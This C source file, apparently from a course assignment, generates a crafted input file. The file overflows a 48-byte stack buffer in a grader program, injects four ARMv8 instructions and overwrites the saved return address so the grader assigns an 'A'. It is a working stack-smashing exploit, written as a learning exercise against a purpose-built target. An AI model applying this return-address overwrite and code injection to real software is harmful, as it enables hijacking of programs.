/*--------------------------------------------------------------------*/
/* createDataA.c                                                      */
/* Author: David Hovey                                                */
/*--------------------------------------------------------------------*/
/*
  Produces a file called dataA which causes the grader program 
  to assign a grade of 'A' even though the original grader program
  never assigns an A. 

  The produced file overflows readString's stack frame and overwrites
  getName's saved x30 with the address of injected machine instructions
  that load the address of global trade variable into x0, move
  'A' into w1, set grade = 'A', then return to the program.
*/


#include "miniassembler.h"
#include <stdio.h>
#include <string.h>



/*
   main

   Writes a crafted binary file named "dataA" which contains:
      - the student's name and a null terminator,
      - padding bytes to maintain 4 byte alignment,
      - four ARMv8 machine instructions created w/ miniassembler
      - additional padding to fill readString 48 byte buffer,
      - a final overwritten return address pointing into the
        injected instructions.

   The function...
      - accepts no command line args
      - does not read from stdin
      - write binary data only to "dataA"
      - returns 0 on success, prints no normal output
      - prints an error message if fopen fails

*/
int main() {
    /* User name */
    char name[] = "David";

    /* Alignment padding (4-byte instruction alignment) */
    char alignment[] = "gg";

    /* adr x0, grade */
    unsigned int adrInstr;

    /* mov w1, 0x41 */
    unsigned int movInstr;

    /* strb w1, [x0] */
    unsigned int strbInstr;

    /* b printf(...) (0x400896) */
    unsigned int bInstr;

    /* 24 bytes of padding to get to 48 bytes (buffer size) fix this */
    char padding[] = "gggggggggggggggggggggggg";

    /* Address of first adr... instruction */
    unsigned long returnAddress = 0x420060;

    FILE *psFile = fopen("dataA", "w");


    adrInstr = MiniAssembler_adr(0, 0x420044, 0x420060);
    movInstr = MiniAssembler_mov(1, 0x41);
    strbInstr = MiniAssembler_strb(1, 0);
    bInstr = MiniAssembler_b(0x40089c, 0x42006c);

    /* Write name to top of buffer */
    fwrite(&name, strlen(name) + 1, 1, psFile);

    /* Write two bytes of padding for instruction alignment */
    fwrite(&alignment, strlen(alignment), 1, psFile);

    /* Write assembly code instructions */
    fwrite(&adrInstr, sizeof(int), 1, psFile);
    fwrite(&movInstr, sizeof(int), 1, psFile);
    fwrite(&strbInstr, sizeof(int), 1, psFile);
    fwrite(&bInstr, sizeof(int), 1, psFile);

    /* Write padding to fill up remaining 24 bytes of 48 byte buffer */
    fwrite(&padding, strlen(padding), 1, psFile);

    /* Write return address to the final printf statements */
    fwrite(&returnAddress, sizeof(long), 1, psFile);

    fclose(psFile);

    return 0;
}
